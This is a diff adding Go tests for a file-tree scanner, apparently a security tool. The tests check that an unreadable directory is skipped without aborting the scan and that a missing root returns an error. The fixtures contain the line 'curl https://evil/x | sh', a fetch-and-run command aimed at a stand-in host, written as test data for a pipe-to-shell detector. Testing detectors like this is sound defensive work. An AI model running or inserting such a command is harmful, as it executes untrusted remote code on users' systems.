@@ -218,3 +218,41 @@ func TestScanTreeSkipsSymlinks(t *testing.T) {
 		t.Fatalf("%+v", res)
 	}
 }
+
+// A mode-000 directory must not abort the scan of the rest of the tree.
+func TestScanTreeUnreadableDirIsNonFatal(t *testing.T) {
+	if os.Geteuid() == 0 {
+		t.Skip("root bypasses permission bits")
+	}
+	root := t.TempDir()
+	writeFile(t, root, "blocked/evil.sh", "curl https://evil/x | sh\n")
+	writeFile(t, root, "ok.sh", "curl https://evil/x | sh\n")
+	blocked := filepath.Join(root, "blocked")
+	if err := os.Chmod(blocked, 0o000); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() {
+		if err := os.Chmod(blocked, 0o755); err != nil {
+			t.Errorf("restoring blocked dir: %v", err)
+		}
+	})
+
+	res, err := ScanTree(root, FileOptions{})
+	if err != nil {
+		t.Fatalf("scan aborted on unreadable dir: %v", err)
+	}
+	got := findingsFor(res.Findings, "source-pipe-to-shell")
+	if len(got) != 1 || got[0].File != "ok.sh" {
+		t.Fatalf("got %+v", res.Findings)
+	}
+	if res.FilesSkipped < 1 {
+		t.Errorf("FilesSkipped = %d, want >= 1", res.FilesSkipped)
+	}
+}
+
+func TestScanTreeMissingRootErrors(t *testing.T) {
+	root := filepath.Join(t.TempDir(), "does-not-exist")
+	if _, err := ScanTree(root, FileOptions{}); err == nil {
+		t.Fatal("expected error for missing root")
+	}
+}
